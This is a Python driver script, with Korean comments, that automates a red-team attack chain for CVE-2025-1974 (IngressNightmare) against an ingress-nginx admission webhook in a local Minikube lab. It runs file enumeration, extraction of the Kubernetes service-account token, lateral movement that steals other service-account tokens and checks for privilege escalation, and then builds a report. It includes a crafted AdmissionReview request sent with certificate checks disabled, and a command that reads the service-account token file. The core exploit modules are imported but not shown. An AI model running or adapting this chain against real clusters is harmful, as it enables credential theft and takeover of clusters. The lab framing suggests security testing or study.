"""
CVE-2025-1974 Red Team 공격 체인 자동화
========================================
대상  : 로컬 Minikube 격리 클러스터 (cve-2025-1974-lab)
흐름  : T1 파일 열거 → T2 SA 토큰 추출 → T3 Lateral Movement → T4 리포트 생성

사용법:
  # 터미널 1 (외부 실행 시 port-forward 유지)
  kubectl port-forward svc/ingress-nginx-controller-admission 8443:443 -n ingress-nginx

  # 터미널 2
  python3 poc/attack_chain.py [--target URL] [--out results] [--step all|enum|token|lateral]

  # 클러스터 내부 파드에서 실행 시 (port-forward 불필요)
  python3 poc/attack_chain.py \\
    --target https://ingress-nginx-controller-admission.ingress-nginx.svc.cluster.local:443
"""

import argparse
import os
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from poc.modules.file_enum import enumerate_paths, summarize_enum
from poc.modules.token_extract import extract_token
from poc.modules.lateral_move import run_lateral_movement
from poc.modules.reporter import build_report, save_json, save_markdown, print_summary


# ── 공통 출력 ──────────────────────────────────────────────────────────────────

def banner(text: str) -> None:
    width = 60
    print("\n" + "━" * width)
    print(f"  {text}")
    print("━" * width)

def ok(msg):   print(f"  [OK]    {msg}")
def info(msg): print(f"  [INFO]  {msg}")
def warn(msg): print(f"  [WARN]  {msg}")
def fail(msg): print(f"  [FAIL]  {msg}")


# ── Pre-flight 검사 ─────────────────────────────────────────────────────────────

def preflight(target: str) -> bool:
    banner("Pre-flight 검사")

    # kubectl 존재 확인
    try:
        subprocess.check_output(["kubectl", "version", "--client", "--short"],
                                stderr=subprocess.DEVNULL)
        ok("kubectl 사용 가능")
    except Exception:
        try:
            subprocess.check_output(["kubectl", "version", "--client"],
                                    stderr=subprocess.DEVNULL)
            ok("kubectl 사용 가능")
        except Exception:
            warn("kubectl 없음 — kubectl_exec 방법 사용 불가 (webhook_error 방법으로 진행)")

    # 클러스터 연결 확인
    try:
        subprocess.check_output(["kubectl", "cluster-info", "--request-timeout=5s"],
                                stderr=subprocess.DEVNULL)
        ok("Kubernetes 클러스터 연결 확인")
    except Exception:
        warn("클러스터 연결 불가 — kubectl_exec 방법 스킵")

    # webhook 연결 확인 (간단한 TCP 수준)
    import ssl
    import urllib.request
    import urllib.error
    import json
    import uuid

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    payload = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "preflight", "namespace": "default", "operation": "CREATE",
            "userInfo": {"username": "preflight"},
            "object": {
                "apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
                "metadata": {"name": "preflight", "namespace": "default", "annotations": {}},
                "spec": {"ingressClassName": "nginx", "rules": [{
                    "host": "preflight.local",
                    "http": {"paths": [{"path": "/", "pathType": "Prefix",
                                        "backend": {"service": {"name": "svc", "port": {"number": 80}}}}]},
                }]},
            },
        },
    }
    req = urllib.request.Request(
        f"{target}/networking/v1/ingresses",
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=8) as r:
            r.read()
        ok(f"Webhook 연결 확인: {target}")
        return True
    except urllib.error.HTTPError:
        ok(f"Webhook 연결 확인 (HTTP 오류 응답 = 연결됨): {target}")
        return True
    except Exception as e:
        fail(f"Webhook 연결 실패: {e}")
        fail("  port-forward가 실행 중인지 확인:")
        fail("  kubectl port-forward svc/ingress-nginx-controller-admission 8443:443 -n ingress-nginx")
        return False


# ── T1: 파일 열거 ───────────────────────────────────────────────────────────────

def run_t1(target: str) -> dict | None:
    banner("T1 — 파일 열거 (시나리오 A)")
    try:
        results = enumerate_paths(target, verbose=True)
        summary = summarize_enum(results)
        print()
        ok(f"열거 완료: {summary['accessible_count']}/{summary['total_probed']} 경로 접근 가능")
        return summary
    except Exception as e:
        warn(f"T1 파일 열거 실패: {e}")
        return None


# ── T2: 토큰 추출 ───────────────────────────────────────────────────────────────

def run_t2(target: str):
    banner("T2 — SA 토큰 추출 (시나리오 B)")
    info("방법 1: kubectl exec (기본)")
    info("방법 2: webhook 에러 메시지 파싱 (fallback)")
    print()

    result = extract_token(target, prefer_method="kubectl_exec")

    if result and result.extract_success:
        ok(f"토큰 추출 성공 (방법: {result.method_used})")
        ok(f"ServiceAccount: {result.namespace}/{result.sa_name}")
        info(f"JWT 헤더: {result.header}")
        info(f"토큰 앞 60자: {result.raw_token[:60]}...")
    else:
        fail("토큰 추출 실패 — T3 (Lateral Movement) 스킵")
        if result:
            fail(f"  오류: {result.error}")

    return result


# ── T3: Lateral Movement ────────────────────────────────────────────────────────

def run_t3(token: str) -> list:
    banner("T3 — Kubernetes API Lateral Movement (시나리오 C)")

    results = run_lateral_movement(token, levels=[1, 2, 3])

    for r in results:
        status = "성공" if r.success else "실패"
        label = {1: "정보 수집", 2: "다른 SA 토큰 탈취", 3: "권한 상승 확인"}.get(r.level, "")
        print()
        ok(f"Level {r.level} — {label}: {status}") if r.success else warn(f"Level {r.level} — {label}: {status}")

        if r.level == 1 and r.success:
            for resource, data in r.details.items():
                if "count" in data:
                    info(f"  {resource}: {data['count']}개")

        if r.level == 2 and r.success:
            info(f"  다른 SA 토큰 {r.details.get('count', 0)}개 발견")

        if r.level == 3:
            can_i = r.details.get("can_i", {})
            for action, result in can_i.items():
                marker = "  [YES]" if result == "yes" else "  [no] "
                print(f"{marker} {action}")

    return results


# ── T4: 리포트 생성 ─────────────────────────────────────────────────────────────

def run_t4(target: str, out_dir: str, enum_summary, token_result, lateral_results) -> None:
    banner("T4 — 결과 리포트 생성")

    report = build_report(target, enum_summary, token_result, lateral_results)
    json_path = save_json(report, out_dir)
    md_path   = save_markdown(report, out_dir)

    ok(f"JSON 리포트: {json_path}")
    ok(f"MD  리포트:  {md_path}")

    print()
    print_summary(report)


# ── 메인 ──────────────────────────────────────────────────────────────────────

def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2025-1974 Red Team 공격 체인 — 로컬 Minikube 전용"
    )
    parser.add_argument(
        "--target", default="https://127.0.0.1:8443",
        help="webhook URL (기본: https://127.0.0.1:8443)"
    )
    parser.add_argument(
        "--out", default="results",
        help="결과 저장 디렉터리 (기본: results)"
    )
    parser.add_argument(
        "--step", default="all",
        choices=["all", "enum", "token", "lateral"],
        help="실행할 단계 (기본: all)"
    )
    args = parser.parse_args()

    print()
    print("=" * 60)
    print("  CVE-2025-1974 (IngressNightmare) — Red Team 공격 체인")
    print("  대상: 로컬 Minikube 격리 환경 전용")
    print("=" * 60)

    # Pre-flight
    if not preflight(args.target):
        return 1

    enum_summary   = None
    token_result   = None
    lateral_results = []

    # 단계별 실행
    if args.step in ("all", "enum"):
        enum_summary = run_t1(args.target)

    if args.step in ("all", "token"):
        token_result = run_t2(args.target)

    if args.step in ("all", "lateral"):
        if token_result and token_result.extract_success:
            lateral_results = run_t3(token_result.raw_token)
        else:
            banner("T3 — Lateral Movement (스킵)")
            warn("T2 토큰 추출이 실패했으므로 T3를 스킵합니다.")
            warn("  수동으로 토큰을 지정하려면:")
            warn("  TOKEN=$(kubectl exec -n ingress-nginx <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token)")

    # T4 리포트는 step=all 또는 단일 단계 완료 후 항상 생성
    run_t4(args.target, args.out, enum_summary, token_result, lateral_results)

    print()
    print("=" * 60)
    print("  공격 체인 종료")
    print("=" * 60)

    return 0 if (token_result and token_result.extract_success) else 1


if __name__ == "__main__":
    sys.exit(main())
